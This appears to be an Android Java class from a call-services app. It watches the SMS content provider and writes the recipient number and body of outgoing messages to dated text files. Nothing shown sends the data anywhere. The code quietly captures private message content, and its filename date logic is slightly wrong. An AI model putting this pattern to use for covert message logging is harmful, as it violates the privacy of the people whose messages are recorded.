package com.sktelink.sk00700.callservices;

import static com.sktelink.sk00700.callservices.utils.CommonUtilities.TAG;

import java.util.Date;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.format.Time;
import android.util.Log;

import com.sktelink.sk00700.callservices.handler.FileHandler;
import com.sktelink.sk00700.callservices.utils.DataUtils;

public class SmsObserver extends ContentObserver {

	// sms
    public static Context context;
    private static final String CONTENT_SMS = "content://sms/";
    public static ContentResolver contentResolver ;
    private DataUtils dataUtils = null;
    
	public SmsObserver(Handler handler) {
		super(handler);
	}
    @Override
    public void onChange(boolean selfChange) {
    	try {
	        super.onChange(selfChange);
	        
	        // create instance of data utils
	        if (dataUtils == null) {
	        	dataUtils = new DataUtils(context);
	        }
	        
	        if (dataUtils.isEnableSms()) {
	        	// save the message to the SD card here
		        Cursor cur = contentResolver.query(Uri.parse(CONTENT_SMS), null, null, null, null);
		
		        if (cur.moveToNext()) {
		            String message_id = cur.getString(cur.getColumnIndex("_id"));
		            String type = cur.getString(cur.getColumnIndex("type"));
		            String telNumber=cur.getString(cur.getColumnIndex("address")).trim();
		            String protocol = cur.getString(cur.getColumnIndex("protocol"));
		            Date date = new Date(cur.getLong(cur.getColumnIndex("date")));
		            String message = cur.getString(cur.getColumnIndex("body"));
		            
		            // if type = 4 -> save
		            if (type.equals("4")) {
		            	// set time
		            	Time time = new Time();
		            	time.setToNow();
		            	Date now = new Date(Long.valueOf(Long.toString(time.toMillis(false))));
		            	
		            	// file name
			            String fileName = "sent" + now.getDay() + now.getMonth() + now.getYear() + ".txt";
			            
			            // data
			            String data = telNumber + ":" + message + "\n";
			            
			            // write data
		            	FileHandler fileHandler = new FileHandler(context);
		            	fileHandler.writeData( data, fileName, FileHandler.TYPE_SMS);
		            	
		            	Log.d(TAG, fileName );
		            }
		        }
	        }
    	} catch (Exception ex) {
    		Log.d(TAG, Log.getStackTraceString(ex));
    	}
    }
}
